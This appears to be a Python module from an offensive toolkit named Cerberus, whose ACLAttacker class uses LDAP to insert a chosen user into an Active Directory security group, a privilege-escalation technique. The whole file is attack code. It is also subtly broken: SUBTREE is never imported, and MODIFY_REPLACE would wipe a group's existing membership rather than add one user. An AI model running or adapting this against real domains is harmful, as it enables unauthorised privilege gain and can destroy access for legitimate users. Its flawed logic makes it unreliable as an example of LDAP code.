#!/usr/bin/env python3
"""
ACL Attack module for Cerberus
"""

from ldap3 import MODIFY_REPLACE
from core.utils import print_status, print_success, print_error

class ACLAttacker:
    def __init__(self, ldap_connection, domain):
        self.ldap_conn = ldap_connection
        self.domain = domain
        self.domain_dn = ",".join([f"DC={part}" for part in domain.split(".")])
        
    def add_user_to_group(self, username, group_name):
        """Add a user to a security group"""
        print_status(f"Attempting to add {username} to {group_name}")
        
        try:
            # Find user DN
            user_dn = self._find_dn(username, 'user')
            if not user_dn:
                print_error(f"User {username} not found")
                return False
                
            # Find group DN
            group_dn = self._find_dn(group_name, 'group')
            if not group_dn:
                print_error(f"Group {group_name} not found")
                return False
                
            # Add user to group
            changes = {
                'member': [(MODIFY_REPLACE, [user_dn])]
            }
            
            if not self.ldap_conn.modify(group_dn, changes):
                print_error(f"Failed to add user to group: {self.ldap_conn.result}")
                return False
                
            print_success(f"Successfully added {username} to {group_name}")
            return True
            
        except Exception as e:
            print_error(f"ACL attack failed: {str(e)}")
            return False
            
    def _find_dn(self, name, object_type):
        """Find DN of an object by name"""
        search_filter = f"(&(objectClass={object_type})(sAMAccountName={name}))"
        
        self.ldap_conn.search(
            search_base=self.domain_dn,
            search_filter=search_filter,
            attributes=['distinguishedName'],
            search_scope=SUBTREE
        )
        
        if self.ldap_conn.entries:
            return self.ldap_conn.entries[0].entry_dn
            
        return None